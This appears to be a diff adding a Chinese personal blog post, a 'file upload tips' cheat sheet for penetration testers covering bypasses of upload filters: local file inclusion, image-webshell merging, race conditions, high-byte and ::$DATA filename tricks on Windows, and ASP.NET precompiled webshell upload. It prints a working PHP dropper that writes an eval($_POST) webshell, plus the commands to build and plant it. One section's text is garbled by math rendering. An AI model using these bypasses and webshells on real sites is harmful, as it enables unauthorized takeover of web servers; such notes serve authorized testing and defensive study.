@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>记录文件上传Tips（Updating） | rebootORZ</title>
+<meta name="description" content="一名默默无闻的攻城狮">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://rebootorz.github.io/favicon.ico?v=1612688779741">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://rebootorz.github.io/styles/main.css">
+
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-KB4J95VFFD"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-KB4J95VFFD');
+</script>
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://rebootorz.github.io">rebootORZ</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="https://rebootorz.github.io/tag/VLOcVZGpM/" class="menu">
+                Golang学习之路
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>记录文件上传Tips（Updating）</h1>
+            <p class="article-meta">
+              2021-02-07
+              
+                <a href="https://rebootorz.github.io/tag/NycXQ8xNz/" class="badge secondary">
+                  渗透技巧
+                </a>
+              
+            </p>
+            
+            <div class="post-content">
+              <h1 id="解析漏洞">解析漏洞</h1>
+<figure data-type="image" tabindex="1"><img src="https://rebootorz.github.io/post-images/1612688666358.png" alt="" loading="lazy"></figure>
+<h1 id="利用本地文件包含php">利用本地文件包含（PHP）</h1>
+<p>上传满足要求的文件格式，如png，内容为shell代码，获取到文件路径。<br>
+利用本地文件包含漏洞包含上传的shell.png文件，如果代码存在漏洞，可能会将png文件当做php来解析。<br>
+<strong>注：</strong><br>
+也可以往任意目录写入shell，例如上传的文件内容如下：</p>
+<pre><code>&lt;?php
+    fputs(fopen(&quot;../shell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[a]); ?&gt;&quot;);
+?&gt;
+</code></pre>
+<p>可以通过控制如../shell.php，来向任意目录写入文件。</p>
+<h1 id="图片马的两种形式">图片马的两种形式</h1>
+<h2 id="法一">法一：</h2>
+<p>可以上传.php，但是对图片内容做来检测，例如头部、长宽等，导致直接上传php文件失败，需要做一下合并：</p>
+<pre><code>cat image.jpg shell.php &gt; shell.php
+</code></pre>
+<h2 id="法一-2">法一：</h2>
+<p>如果只能上传图片后缀，但是对内容没有要求的，需要结合文件包含。</p>
+<h1 id="条件竞争">条件竞争</h1>
+<p>上传文件时，允许上传任意文件，然后做检测，不满足要求的会删除，满足要求的再保留或存入相应目录。<br>
+此类上传往往会有个缓存目录，通过先上传shell.php，然后在被删除之前的这个间隙，不断的去请求shell.php，触发其代码，例如通过其代码往目录中写入新的shell文件。<br>
+shell.php:</p>
+<pre><code>&lt;?php
+    fputs(fopen(&quot;../shell.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[a]); ?&gt;&quot;);
+?&gt;
+</code></pre>
+<h1 id="追加高位字符">追加高位字符</h1>
+<p>如果服务器是windows，上传使用的是黑名单，不允许php，可以在上传文件后面插入满足[\x80-\xff]的高位字符<br>
+<strong>注：</strong>\x80表示字符的编码是128，\xff表示字符的编码是255，[\x80-\xff]表示编码在128-255之间的字符。具体高位字符如下：</p>
+<pre><code>DEC 	OCT 	HEX 	BIN 	缩写/符号 	HTML实体 	描述
+128 	200 	80 	10000000 	€ 	&amp;#128; 	Euro sign
+129 	201 	81 	10000001 	  	  	 
+130 	202 	82 	10000010 	‚ 	&amp;#130; 	Single low-9 quotation mark
+131 	203 	83 	10000011 	ƒ 	&amp;#131; 	Latin small letter f with hook
+132 	204 	84 	10000100 	„ 	&amp;#132; 	Double low-9 quotation mark
+133 	205 	85 	10000101 	… 	&amp;#133; 	Horizontal ellipsis
+134 	206 	86 	10000110 	† 	&amp;#134; 	Dagger
+135 	207 	87 	10000111 	‡ 	&amp;#135; 	Double dagger
+136 	210 	88 	10001000 	ˆ 	&amp;#136; 	Modifier letter circumflex accent
+137 	211 	89 	10001001 	‰ 	&amp;#137; 	Per mille sign
+138 	212 	8A 	10001010 	Š 	&amp;#138; 	Latin capital letter S with caron
+139 	213 	8B 	10001011 	‹ 	&amp;#139; 	Single left-pointing angle quotation
+140 	214 	8C 	10001100 	Œ 	&amp;#140; 	Latin capital ligature OE
+141 	215 	8D 	10001101 	  	  	 
+142 	216 	8E 	10001110 	Ž 	&amp;#142; 	Latin capital letter Z with caron
+143 	217 	8F 	10001111 	  	  	 
+144 	220 	90 	10010000 	  	  	 
+145 	221 	91 	10010001 	‘ 	&amp;#145; 	Left single quotation mark
+146 	222 	92 	10010010 	’ 	&amp;#146; 	Right single quotation mark
+147 	223 	93 	10010011 	“ 	&amp;#147; 	Left double quotation mark
+148 	224 	94 	10010100 	” 	&amp;#148; 	Right double quotation mark
+149 	225 	95 	10010101 	• 	&amp;#149; 	Bullet
+150 	226 	96 	10010110 	– 	&amp;#150; 	En dash
+151 	227 	97 	10010111 	— 	&amp;#151; 	Em dash
+152 	230 	98 	10011000 	˜ 	&amp;#152; 	Small tilde
+153 	231 	99 	10011001 	™ 	&amp;#153; 	Trade mark sign
+154 	232 	9A 	10011010 	š 	&amp;#154; 	Latin small letter S with caron
+155 	233 	9B 	10011011 	› 	&amp;#155; 	Single right-pointing angle quotation mark
+156 	234 	9C 	10011100 	œ 	&amp;#156; 	Latin small ligature oe
+157 	235 	9D 	10011101 	  	  	 
+158 	236 	9E 	10011110 	ž 	&amp;#158; 	Latin small letter z with caron
+159 	237 	9F 	10011111 	Ÿ 	&amp;#159; 	Latin capital letter Y with diaeresis
+160 	240 	A0 	10100000 	  	&amp;#160; 	Non-breaking space
+161 	241 	A1 	10100001 	¡ 	&amp;#161; 	Inverted exclamation mark
+162 	242 	A2 	10100010 	¢ 	&amp;#162; 	Cent sign
+163 	243 	A3 	10100011 	£ 	&amp;#163; 	Pound sign
+164 	244 	A4 	10100100 	¤ 	&amp;#164; 	Currency sign
+165 	245 	A5 	10100101 	¥ 	&amp;#165; 	Yen sign
+166 	246 	A6 	10100110 	¦ 	&amp;#166; 	Pipe, Broken vertical bar
+167 	247 	A7 	10100111 	§ 	&amp;#167; 	Section sign
+168 	250 	A8 	10101000 	¨ 	&amp;#168; 	Spacing diaeresis - umlaut
+169 	251 	A9 	10101001 	© 	&amp;#169; 	Copyright sign
+170 	252 	AA 	10101010 	ª 	&amp;#170; 	Feminine ordinal indicator
+171 	253 	AB 	10101011 	« 	&amp;#171; 	Left double angle quotes
+172 	254 	AC 	10101100 	¬ 	&amp;#172; 	Not sign
+173 	255 	AD 	10101101 	­ 	&amp;#173; 	Soft hyphen
+174 	256 	AE 	10101110 	® 	&amp;#174; 	Registered trade mark sign
+175 	257 	AF 	10101111 	¯ 	&amp;#175; 	Spacing macron - overline
+176 	260 	B0 	10110000 	° 	&amp;#176; 	Degree sign
+177 	261 	B1 	10110001 	± 	&amp;#177; 	Plus-or-minus sign
+178 	262 	B2 	10110010 	² 	&amp;#178; 	Superscript two - squared
+179 	263 	B3 	10110011 	³ 	&amp;#179; 	Superscript three - cubed
+180 	264 	B4 	10110100 	´ 	&amp;#180; 	Acute accent - spacing acute
+181 	265 	B5 	10110101 	µ 	&amp;#181; 	Micro sign
+182 	266 	B6 	10110110 	¶ 	&amp;#182; 	Pilcrow sign - paragraph sign
+183 	267 	B7 	10110111 	· 	&amp;#183; 	Middle dot - Georgian comma
+184 	270 	B8 	10111000 	¸ 	&amp;#184; 	Spacing cedilla
+185 	271 	B9 	10111001 	¹ 	&amp;#185; 	Superscript one
+186 	272 	BA 	10111010 	º 	&amp;#186; 	Masculine ordinal indicator
+187 	273 	BB 	10111011 	» 	&amp;#187; 	Right double angle quotes
+188 	274 	BC 	10111100 	¼ 	&amp;#188; 	Fraction one quarter
+189 	275 	BD 	10111101 	½ 	&amp;#189; 	Fraction one half
+190 	276 	BE 	10111110 	¾ 	&amp;#190; 	Fraction three quarters
+191 	277 	BF 	10111111 	¿ 	&amp;#191; 	Inverted question mark
+192 	300 	C0 	11000000 	À 	&amp;#192; 	Latin capital letter A with grave
+193 	301 	C1 	11000001 	Á 	&amp;#193; 	Latin capital letter A with acute
+194 	302 	C2 	11000010 	Â 	&amp;#194; 	Latin capital letter A with circumflex
+195 	303 	C3 	11000011 	Ã 	&amp;#195; 	Latin capital letter A with tilde
+196 	304 	C4 	11000100 	Ä 	&amp;#196; 	Latin capital letter A with diaeresis
+197 	305 	C5 	11000101 	Å 	&amp;#197; 	Latin capital letter A with ring above
+198 	306 	C6 	11000110 	Æ 	&amp;#198; 	Latin capital letter AE
+199 	307 	C7 	11000111 	Ç 	&amp;#199; 	Latin capital letter C with cedilla
+200 	310 	C8 	11001000 	È 	&amp;#200; 	Latin capital letter E with grave
+201 	311 	C9 	11001001 	É 	&amp;#201; 	Latin capital letter E with acute
+202 	312 	CA 	11001010 	Ê 	&amp;#202; 	Latin capital letter E with circumflex
+203 	313 	CB 	11001011 	Ë 	&amp;#203; 	Latin capital letter E with diaeresis
+204 	314 	CC 	11001100 	Ì 	&amp;#204; 	Latin capital letter I with grave
+205 	315 	CD 	11001101 	Í 	&amp;#205; 	Latin capital letter I with acute
+206 	316 	CE 	11001110 	Î 	&amp;#206; 	Latin capital letter I with circumflex
+207 	317 	CF 	11001111 	Ï 	&amp;#207; 	Latin capital letter I with diaeresis
+208 	320 	D0 	11010000 	Ð 	&amp;#208; 	Latin capital letter ETH
+209 	321 	D1 	11010001 	Ñ 	&amp;#209; 	Latin capital letter N with tilde
+210 	322 	D2 	11010010 	Ò 	&amp;#210; 	Latin capital letter O with grave
+211 	323 	D3 	11010011 	Ó 	&amp;#211; 	Latin capital letter O with acute
+212 	324 	D4 	11010100 	Ô 	&amp;#212; 	Latin capital letter O with circumflex
+213 	325 	D5 	11010101 	Õ 	&amp;#213; 	Latin capital letter O with tilde
+214 	326 	D6 	11010110 	Ö 	&amp;#214; 	Latin capital letter O with diaeresis
+215 	327 	D7 	11010111 	× 	&amp;#215; 	Multiplication sign
+216 	330 	D8 	11011000 	Ø 	&amp;#216; 	Latin capital letter O with slash
+217 	331 	D9 	11011001 	Ù 	&amp;#217; 	Latin capital letter U with grave
+218 	332 	DA 	11011010 	Ú 	&amp;#218; 	Latin capital letter U with acute
+219 	333 	DB 	11011011 	Û 	&amp;#219; 	Latin capital letter U with circumflex
+220 	334 	DC 	11011100 	Ü 	&amp;#220; 	Latin capital letter U with diaeresis
+221 	335 	DD 	11011101 	Ý 	&amp;#221; 	Latin capital letter Y with acute
+222 	336 	DE 	11011110 	Þ 	&amp;#222; 	Latin capital letter THORN
+223 	337 	DF 	11011111 	ß 	&amp;#223; 	Latin small letter sharp s - ess-zed
+224 	340 	E0 	11100000 	à 	&amp;#224; 	Latin small letter a with grave
+225 	341 	E1 	11100001 	á 	&amp;#225; 	Latin small letter a with acute
+226 	342 	E2 	11100010 	â 	&amp;#226; 	Latin small letter a with circumflex
+227 	343 	E3 	11100011 	ã 	&amp;#227; 	Latin small letter a with tilde
+228 	344 	E4 	11100100 	ä 	&amp;#228; 	Latin small letter a with diaeresis
+229 	345 	E5 	11100101 	å 	&amp;#229; 	Latin small letter a with ring above
+230 	346 	E6 	11100110 	æ 	&amp;#230; 	Latin small letter ae
+231 	347 	E7 	11100111 	ç 	&amp;#231; 	Latin small letter c with cedilla
+232 	350 	E8 	11101000 	è 	&amp;#232; 	Latin small letter e with grave
+233 	351 	E9 	11101001 	é 	&amp;#233; 	Latin small letter e with acute
+234 	352 	EA 	11101010 	ê 	&amp;#234; 	Latin small letter e with circumflex
+235 	353 	EB 	11101011 	ë 	&amp;#235; 	Latin small letter e with diaeresis
+236 	354 	EC 	11101100 	ì 	&amp;#236; 	Latin small letter i with grave
+237 	355 	ED 	11101101 	í 	&amp;#237; 	Latin small letter i with acute
+238 	356 	EE 	11101110 	î 	&amp;#238; 	Latin small letter i with circumflex
+239 	357 	EF 	11101111 	ï 	&amp;#239; 	Latin small letter i with diaeresis
+240 	360 	F0 	11110000 	ð 	&amp;#240; 	Latin small letter eth
+241 	361 	F1 	11110001 	ñ 	&amp;#241; 	Latin small letter n with tilde
+242 	362 	F2 	11110010 	ò 	&amp;#242; 	Latin small letter o with grave
+243 	363 	F3 	11110011 	ó 	&amp;#243; 	Latin small letter o with acute
+244 	364 	F4 	11110100 	ô 	&amp;#244; 	Latin small letter o with circumflex
+245 	365 	F5 	11110101 	õ 	&amp;#245; 	Latin small letter o with tilde
+246 	366 	F6 	11110110 	ö 	&amp;#246; 	Latin small letter o with diaeresis
+247 	367 	F7 	11110111 	÷ 	&amp;#247; 	Division sign
+248 	370 	F8 	11111000 	ø 	&amp;#248; 	Latin small letter o with slash
+249 	371 	F9 	11111001 	ù 	&amp;#249; 	Latin small letter u with grave
+250 	372 	FA 	11111010 	ú 	&amp;#250; 	Latin small letter u with acute
+251 	373 	FB 	11111011 	û 	&amp;#251; 	Latin small letter u with circumflex
+252 	374 	FC 	11111100 	ü 	&amp;#252; 	Latin small letter u with diaeresis
+253 	375 	FD 	11111101 	ý 	&amp;#253; 	Latin small letter y with acute
+254 	376 	FE 	11111110 	þ 	&amp;#254; 	Latin small letter thorn
+255 	377 	FF 	11111111 	ÿ 	&amp;#255; 	Latin small letter y with diaeresis
+</code></pre>
+<h1 id="追加data">追加::$DATA</h1>
+<p>在window的时候如果文件名+&quot;::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">把</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA&quot;会把::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord">&quot;</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">把</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA之后的数据当成文件流处理,不会检测后缀名，且保持::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">之</mi><mi mathvariant="normal">前</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">他</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">目</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">检</mi><mi mathvariant="normal">查</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">缀</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">例</mi><mi mathvariant="normal">如</mi><mo>:</mo><mi mathvariant="normal">&quot;</mi><mi>p</mi><mi>h</mi><mi>p</mi><mi>i</mi><mi>n</mi><mi>f</mi><mi>o</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA之前的文件名，他的目的就是不检查后缀名
+例如:&quot;phpinfo.php::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">他</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">目</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">检</span><span class="mord cjk_fallback">查</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">缀</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">如</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">&quot;</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">o</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA&quot;Windows会自动去掉末尾的::$DATA变成&quot;phpinfo.php&quot;</p>
+<h1 id="aspx预编译上传绕过">aspx预编译上传绕过</h1>
+<ul>
+<li>当站点启用了预编译（最明显当特征就是上传aspx后访问报错，提示信息中出现&quot;xxx has not been pre-complied,and can not be requested&quot;）,这种情况，部分环境是可以尝试asp文件进行getshell的。因为asp文件并非.Net处理。<br>
+这种时候我们可以在本地对.aspx进行编译后上传到站点bin目录下：<br>
+使用NET.Framework自带的aspnet_compiler.exe进行编译。</li>
+<li>aspnet_compiler.exe 默认目录</li>
+</ul>
+<pre><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727
+</code></pre>
+<ul>
+<li>编译</li>
+</ul>
+<pre><code>aspnet_compiler -v \ -p (web文件所在目录) (编译后存储目录) -fixednames
+</code></pre>
+<p>生成文件中有一个.dll文件，使用dnspy查看到话里面有个AppRelativeVirtualPath，这个就是shell.aspx的地址（这个地址是相对于根目录的地址，例如是&quot;/shell.aspx&quot;，则上传后访问就是http://xxx.xxx/shell.aspx）。<br>
+最后只需要把.dll和shell.aspx上传到站点的bin目录下即可。</p>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://rebootorz.github.io/KBF21wEvg/">
+                <h3 class="post-title">
+                  [Go] 12.锁
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://rebootorz.github.io/images/avatar.png?v=1612688779741" class="no-responsive avatar">
+    <div class="text-muted">一名默默无闻的攻城狮</div>
+    <div class="social-container">
+      
+        
+          <a href="https://github.com/rebootORZ" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/HAUEHo9Ma/">记录文件上传Tips（Updating）</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/KBF21wEvg/">[Go] 12.锁</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/VwkM_t1Le/">红队常见浏览器密码抓取破解</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/aC7_yNHBz/">记录一些突破性的XSS Payload（Updating）</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/cDP755kpw/">[Go] 11.Channel</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/msC3viyDp/">[Go] 10.Goroutine（并发）</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/_UnWMbR-r/">[Go] 9.异常处理</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/z4gmLQp1H/">[Go] 8.分支循环</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/LGmqka8O9/">[Go] 7.接口</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://rebootorz.github.io/k3YOnVa0S/">[Go] 6.方法</a>
+            </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://rebootorz.github.io/tag/NycXQ8xNz/" class="badge warning">
+          渗透技巧
+        </a>
+      
+        <a href="https://rebootorz.github.io/tag/VLOcVZGpM/" class="badge secondary">
+          Golang
+        </a>
+      
+        <a href="https://rebootorz.github.io/tag/BjedM9kLx/" class="badge secondary">
+          红队
+        </a>
+      
+        <a href="https://rebootorz.github.io/tag/4EHijLUV6/" class="badge success">
+          物联网安全
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    高度自律  绝对自由 | <a class="rss" href="https://rebootorz.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
